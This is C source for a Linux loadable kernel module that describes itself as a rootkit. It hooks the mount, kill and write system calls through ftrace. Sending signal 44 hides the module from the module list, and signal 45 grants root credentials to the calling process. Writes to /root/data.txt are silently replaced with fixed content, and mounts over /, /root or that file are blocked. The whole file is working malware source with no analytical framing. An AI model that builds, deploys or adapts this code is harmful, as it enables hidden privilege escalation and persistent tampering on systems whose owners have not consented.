#include <linux/init.h> 
#include <linux/module.h>
#include <linux/kernel.h> 
#include <linux/syscalls.h>
#include <linux/kallsyms.h>
#include <linux/version.h>
#include <linux/cred.h>
#include <linux/namei.h>
#include <linux/fs.h>
#include <linux/fdtable.h>
#include <linux/uaccess.h>
#include <linux/slab.h>

#include "ftrace_helper.h"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Trevohack");
MODULE_DESCRIPTION("LKM Library");
MODULE_VERSION("0.02");

#define TARGET_FILE "/root/data.txt"
#define TARGET_CONTENT "hello\n"
#define TARGET_CONTENT_SIZE (sizeof(TARGET_CONTENT) - 1)

#if defined(CONFIG_X86_64) && (LINUX_VERSION_CODE >= KERNEL_VERSION(4,17,0))
#define PTREGS_SYSCALL_STUBS 1
#endif

static struct list_head *prev_module;
static short hidden = 0;

#ifdef PTREGS_SYSCALL_STUBS
static asmlinkage long (*orig_mount)(const struct pt_regs *);
static asmlinkage long (*orig_kill)(const struct pt_regs *);
static asmlinkage long (*orig_write)(const struct pt_regs *);

asmlinkage long hook_mount(const struct pt_regs *regs)
{
    char __user *source = (void *)regs->si;
    char __user *target = (void *)regs->di;

    char *target_buf;
    char *source_buf;

    target_buf = kmalloc(PATH_MAX, GFP_KERNEL);
    if (!target_buf) return -ENOMEM;
    
    source_buf = kmalloc(PATH_MAX, GFP_KERNEL);
    if (!source_buf){
        kfree(target_buf);
        return -ENOMEM;
    }
    

    if (copy_from_user(source_buf, source, PATH_MAX)){
        kfree(source_buf);
        kfree(target_buf);
        return -EFAULT;
    }

    if (copy_from_user(target_buf, target, PATH_MAX)){
        kfree(source_buf);
        kfree(target_buf);
        return -EFAULT;
    }

    if (   strcmp(source_buf, TARGET_FILE) == 0 || strcmp(source_buf, "/root") == 0
        || strcmp(source_buf, "/")         == 0 || strcmp(target_buf, TARGET_FILE) == 0 
        || strcmp(target_buf, "/root")     == 0 || strcmp(target_buf, "/") == 0)  {
        
        kfree(source_buf);
        kfree(target_buf);
        return 0;
    }

    kfree(source_buf);
    kfree(target_buf);
    return orig_mount(regs);
}

asmlinkage long hook_kill(const struct pt_regs *regs)
{
    int sig = regs->si;
    void showme(void);
    void hideme(void);
    void set_root(void);

    if (sig == 44 && hidden == 0) {
        hideme();
        hidden = 1;
        return 0;
    } else if (sig == 44 && hidden == 1) {
        showme();
        hidden = 0;
        return 0;
    } else if (sig == 45) {
        set_root();
        return 0;
    }

    return orig_kill(regs);
}

asmlinkage long hook_write(const struct pt_regs *regs)
{
    int fd = regs->di;
    size_t count = regs->dx;
    struct file *file;
    struct path path;
    char *buf_path = kmalloc(PATH_MAX, GFP_KERNEL);
    char *tmp;

    if (!buf_path)
        return -ENOMEM;

    file = fcheck(fd);
    if (file) {
        path = file->f_path;
        path_get(&file->f_path);
        tmp = d_path(&path, buf_path, PATH_MAX);
        path_put(&path);
        if (!IS_ERR(tmp) && strcmp(tmp, TARGET_FILE) == 0) {
            file = filp_open(TARGET_FILE, O_WRONLY | O_CREAT, 0644);
            if (!IS_ERR(file)) {
                kernel_write(file, TARGET_CONTENT, TARGET_CONTENT_SIZE, 0);
                filp_close(file, NULL);
            }
            kfree(buf_path);
            return count; 
        }
    }

    kfree(buf_path);
    return orig_write(regs);
}
#else
static asmlinkage long (*orig_mount)(char *dev_name, char *dir_name, char *type, unsigned long flags, void *data);
static asmlinkage long (*orig_kill)(pid_t pid, int sig);
static asmlinkage long (*orig_write)(unsigned int fd, const char __user *buf, size_t count);

asmlinkage long hook_mount(char *dev_name, char *dir_name, char *type, unsigned long flags, void *data)
{
    char *dir_buf = kmalloc(PATH_MAX, GFP_KERNEL);

    if (!dir_buf)
        return -ENOMEM;

    if (copy_from_user(dir_buf, dir_name, PATH_MAX)) {
        kfree(dir_buf);
        return -EFAULT;
    }

    if (strcmp(dir_buf, "/") == 0 || strcmp(dir_buf, "/root") == 0 || strcmp(dir_buf, "/root/king.txt") == 0) {
        kfree(dir_buf);
        return -EPERM;
    }

    kfree(dir_buf);
    return orig_mount(dev_name, dir_name, type, flags, data);
}

asmlinkage long hook_kill(pid_t pid, int sig)
{
    void showme(void);
    void hideme(void);
    void set_root(void);

    if (sig == 44 && hidden == 0) {
        hideme();
        hidden = 1;
        return 0;
    } else if (sig == 44 && hidden == 1) {
        showme();
        hidden = 0;
        return 0;
    } else if (sig == 45) {
        set_root();
        return 0;
    }

    return orig_kill(pid, sig);
}

asmlinkage long hook_write(unsigned int fd, const char __user *buf, size_t count)
{
    struct file *file;
    struct path path;
    char *buf_path = kmalloc(PATH_MAX, GFP_KERNEL);
    char *tmp;

    if (!buf_path)
        return -ENOMEM;

    file = fcheck(fd);
    if (file) {
        path = file->f_path;
        path_get(&file->f_path);
        tmp = d_path(&path, buf_path, PATH_MAX);
        path_put(&path);
        if (!IS_ERR(tmp) && strcmp(tmp, TARGET_FILE) == 0) {
            file = filp_open(TARGET_FILE, O_WRONLY | O_CREAT, 0644);
            if (!IS_ERR(file)) {
                kernel_write(file, TARGET_CONTENT, TARGET_CONTENT_SIZE, 0);
                filp_close(file, NULL);
            }
            kfree(buf_path);
            return count; 
        }
    }

    kfree(buf_path);
    return orig_write(fd, buf, count);
}
#endif

void showme(void)
{
    list_add(&THIS_MODULE->list, prev_module);
}

void hideme(void)
{
    prev_module = THIS_MODULE->list.prev;
    list_del(&THIS_MODULE->list);
}

void set_root(void)
{
    struct cred *root;
    root = prepare_creds();

    if (root == NULL)
        return;

    root->uid.val = root->gid.val = 0;
    root->euid.val = root->egid.val = 0;
    root->suid.val = root->sgid.val = 0;
    root->fsuid.val = root->fsgid.val = 0;
    commit_creds(root);
}

static struct ftrace_hook hooks[] = {
    HOOK("sys_mount", hook_mount, &orig_mount),
    HOOK("sys_kill", hook_kill, &orig_kill),
    HOOK("sys_write", hook_write, &orig_write),
};

static int __init rootkit_init(void)
{
    int err;
    err = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
    if (err)
        return err;

    return 0;
}

static void __exit rootkit_exit(void)
{
    fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
}

module_init(rootkit_init);
module_exit(rootkit_exit);
